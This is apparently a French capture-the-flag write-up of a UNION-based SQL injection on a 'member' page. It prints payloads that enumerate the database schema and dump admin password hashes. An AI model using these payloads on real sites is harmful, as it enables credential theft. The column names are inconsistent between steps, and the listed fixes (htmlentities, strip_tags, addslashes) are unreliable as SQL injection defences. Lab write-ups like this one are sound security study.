# member injection SQL

## La faille
`ip`/index.php?page=member

Il est possible de faire une injection SQL en utilisant `UNION` dans le but d'exposer l'intégralité des bases de données du site et leur contenu.
Cela permet de découvrir notamment et en particulier les mots de passe enregistrés des admin/root.

## L'explication
Note: tous les codes suivants ont été insérés dans l'input liée au submit.

si on submit vide, on obtient:
*You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1*

En testant `1 OR 2`, on constate qu'une requete SQL est donc possible :
Voici notre bible pour ce flag : *http://www.sqlinjection.net/column-names/*

`TRUE` permet de valider l'expression le précédant. `UNION` permet de coupler les résultats d'une première requête avec une seconde dont les composantes doivent être les mêmes.

`TRUE UNION SELECT table_schema, table_name FROM information_schema.tables`
Notamment, la table:
```
table_schema: Member_Brute_Force
table_name: db_default
```
`TRUE UNION SELECT table_name, column_name FROM information_schema.columns`
Notamment:
```
table_name: db_default
column_name: username
column_name: password
```
Ce qui permet de rechercher 2 par 2 (étant limités par l'UNION) les résultats pour chaques colonnes de la table users:
`TRUE UNION SELECT last_name, countersign FROM Member_Brute_Force.db_default`
Nous obtenons pour les utilisateurs suivants :
```
username: root
password: 3bf1114a986ba87ed28fc1b5884fc2f8

username: admin
password: 3bf1114a986ba87ed28fc1b5884fc2f8
```
soit en décrypté (md5): *shadow* (les 2 sont les mêmes). En allant sur la page de login (*`ip`/index.php?page=signin*), et en testant les combinaisons trouvées, nous retombons sur le flag !

## Le fix
Les methodes suivantes permettent efficacement de se proteger contre les injections lorsque des champs sont remplis par l'user :
- `mysql_real_escape_string` (concernant les db),
- `htmlentities()`,
- `htmlspecialchars()`,
- `strip_tags()`,
- `addslashes()`,
- et globalement en utilisant la PDO
Il est aussi de bon usage lorsqu'une requete est faite de vérifier deux clés, lorsque cela est possible, afin d'autoriser l'accès au contenu (ex : le champs demandé est le nom d'utilisateur, mais en backend le code vérifie aussi l'identifiant de l'utilisateur loggé).
Vérifier que la string envoyée ne contient pas d'espaces si cela n'est pas nécessaire
Parser le retour de la requête plutot qu'en envoyer l'intégralité du contenu
